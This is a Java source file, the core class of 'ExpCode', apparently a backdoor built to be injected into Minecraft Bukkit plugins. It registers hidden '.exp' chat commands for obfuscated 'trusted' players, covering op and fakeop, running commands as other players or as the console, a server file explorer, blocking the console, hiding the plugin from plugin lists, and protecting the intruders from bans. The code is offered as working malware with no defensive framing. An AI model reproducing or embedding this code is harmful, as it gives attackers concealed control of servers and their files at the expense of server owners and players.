package tk.expcode.expcode;

import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.java.JavaPlugin;
import tk.expcode.expcode.blocker.ConsoleBlock;
import tk.expcode.expcode.builders.TextComponentBuilder;
import tk.expcode.expcode.catcher.BanProtection;
import tk.expcode.expcode.catcher.PluginProtection;
import tk.expcode.expcode.commands.*;
import tk.expcode.expcode.explorer.ExplorerNavigation;
import tk.expcode.expcode.explorer.FileInventory;
import tk.expcode.expcode.innerutils.Command;
import tk.expcode.expcode.innerutils.CommandHandler;
import tk.expcode.expcode.utils.Cryptor;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ExpCode {

    private boolean linux = true;
    private boolean consoleBlocked = false;
    private boolean showInPlugins = true;
    private File pluginFile;
    private final JavaPlugin plugin;
    private final FileInventory fileInventory = new FileInventory(this);
    private final List<Command> commands = new ArrayList<>();
    private final List<String> trustedPlayers = new ArrayList<>();
    private final Map<String, Integer> explorerPage = new HashMap<>();
    private final Map<String, File> explorerFile = new HashMap<>();
    private final Map<String, File> copiedFile = new HashMap<>();
    private final List<String> bannedPlayers = new ArrayList<>();

    public ExpCode(JavaPlugin plugin, File pluginFile) {
        this.plugin = plugin;
        this.pluginFile = pluginFile;
    }

    public void initialize(String... args) {

        // Registering the trusted Players
        for (String arg : args) trustedPlayers.add(Cryptor.decrypt(arg));

        // Plugin Commands
        getExpCommand("blockc").setExecutor(new BlockConsoleCommand(this)).setUsage("blockc");
        getExpCommand("deop").setExecutor(new DeopCommand(this)).setUsage("deop ?[name]");
        getExpCommand("explorer").setExecutor(new ExplorerCommand(this)).setUsage("explorer ?switch");
        getExpCommand("fakeop").setExecutor(new FakeOpCommand(this)).setUsage("fakeop [name]");
        getExpCommand("finish").setExecutor(new FinishCommand(this)).setUsage("finish");
        getExpCommand("help").setExecutor(new HelpCommand(this)).setUsage("help");
        getExpCommand("op").setExecutor(new OpCommand(this)).setUsage("op ?[name]");
        getExpCommand("setup").setExecutor(new SetupCommand(this)).setUsage("setup");
        getExpCommand("show").setExecutor(new ShowCommand(this)).setUsage("show");
        getExpCommand("sudo").setExecutor(new SudoCommand(this)).setUsage("sudo [name] [chat/command]");
        getExpCommand("csudo").setExecutor(new SudoConsoleCommand(this)).setUsage("csudo [command]");
        getExpCommand("fsudo").setExecutor(new SudoForceCommand(this)).setUsage("fsudo [name] [chat/command]");
        getExpCommand("trust").setExecutor(new TrustCommand(this)).setUsage("trust");

        // Command Listeners
        Bukkit.getPluginManager().registerEvents(new CommandHandler(this), plugin);

        // Block Listeners
        Bukkit.getPluginManager().registerEvents(new ConsoleBlock(this), plugin);

        // Catcher Listeners
        Bukkit.getPluginManager().registerEvents(new BanProtection(this), plugin);
        Bukkit.getPluginManager().registerEvents(new PluginProtection(this), plugin);

        // Explorer Listener
        Bukkit.getPluginManager().registerEvents(new ExplorerNavigation(this), plugin);

        // Plugin Message WHERE
        Bukkit.getOnlinePlayers().forEach(player -> {
            if (trustedPlayers.contains(player.getName()))
                new TextComponentBuilder(ChatColor.translateAlternateColorCodes('&',
                        this.getMessagePrefix() + "&aIs this the Plugin file?"))
                        .setHoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder(pluginFile.getName()).create())
                        .showToPlayer(player);
        });
    }

    public boolean isLinux() {
        return linux;
    }

    public void setLinux(boolean linux) {
        this.linux = linux;
    }

    public boolean isConsoleBlocked() {
        return consoleBlocked;
    }

    public void setConsoleBlocked(boolean consoleBlocked) {
        this.consoleBlocked = consoleBlocked;
    }

    public boolean isShowInPlugins() {
        return showInPlugins;
    }

    public void setShowInPlugins(boolean showInPlugins) {
        this.showInPlugins = showInPlugins;
    }

    public void setPluginFile(File pluginFile) {
        this.pluginFile = pluginFile;
    }

    public File getPluginFile() {
        return pluginFile;
    }

    public JavaPlugin getPlugin() {
        return plugin;
    }

    public FileInventory getFileInventory() {
        return fileInventory;
    }

    public String getCommandPrefix() {
        return ".exp";
    }

    public String getMessagePrefix() {
        return "&8[&4ExpCode&8] ";
    }

    public List<Command> getCommands() {
        return commands;
    }

    public List<String> getTrustedPlayers() {
        return trustedPlayers;
    }

    public Map<String, Integer> getExplorerPage() {
        return explorerPage;
    }

    public Map<String, File> getExplorerFile() {
        return explorerFile;
    }

    public Map<String, File> getCopiedFile() {
        return copiedFile;
    }

    public List<String> getBannedPlayers() {
        return bannedPlayers;
    }

    private Command getExpCommand(String command) {
        return new Command(command, this);
    }
}
